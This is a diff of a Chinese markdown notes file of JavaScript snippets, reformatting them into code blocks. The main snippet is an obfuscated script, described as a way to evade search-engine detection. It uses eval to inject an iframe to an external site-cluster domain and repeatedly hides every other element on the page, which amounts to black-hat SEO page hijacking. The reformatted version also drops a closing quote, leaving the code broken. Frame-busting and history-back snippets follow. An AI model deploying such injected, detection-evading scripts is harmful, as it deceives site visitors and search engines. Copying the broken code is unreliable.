@@ -123,43 +123,46 @@
             frameborder='0' width='100%' height='2000'>");
   
 * 3、混淆防止搜索引擎被查的js调用,具体的展示上面是广告下面是站群的代码：
-  
-    var ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" 
+   ```js
+   var ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" 
                                                     marginheight=0 marginwidth=0 
                                                     frameborder="0" width="100%" 
                                                     width="14'+'00" height="63'+'50" 
                                                     src="ht'+'tp://'+'ww'+'w.hx'+'zhan'+'qun.c'+'om/">
-      </iframe></center>';
-      eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');"); 
-      try{
-       setInterval(function(){
+       </iframe></center>;
+       eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');"); 
        try{
-       document.getElementById("div"+"All").style.display="no"+"ne";
-       }catch(e){}
-       for(var i=0;i<document.body.children.length;i++){
-    try{
-    var tagname = document.body.children[i].tagName;
-    var myid = document.body.children[i].id;
-    if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
-    // if(tagname!="center"){
-    document.body.children[i].style.display="non"+"e";
-    //}
-    }
-    }catch(e){}
-       }
-       },100);
-      }catch(e){
+              setInterval(function(){
+              try{
+                            document.getElementById("div"+"All").style.display="no"+"ne";
+              }catch(e){
+
+              }
+              for(var i=0;i<document.body.children.length;i++){
+                     try{
+                     var tagname = document.body.children[i].tagName;
+                     var myid = document.body.children[i].id;
+                     if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
+                            document.body.children[i].style.display="non"+"e";
+                     }
+                     }catch(e){
+
+                     }
+              }
+              },100);
+       }catch(e){
 
        }
-  
+   ```
 ### 六、页面跳出框架
-                                                     
-    <script type="text/javascript">
-      top.location.href='http://www.mahaixiang.cn/';
-    </script>
-
+```js
+<script type="text/javascript">
+top.location.href='http://www.mahaixiang.cn/';
+</script>
+```
 ### 七、返回上一页
-
-    <script type="text/javascript">
-      window.history.back(-1);
-    </script>
+```js
+<script type="text/javascript">
+window.history.back(-1);
+</script>
+```
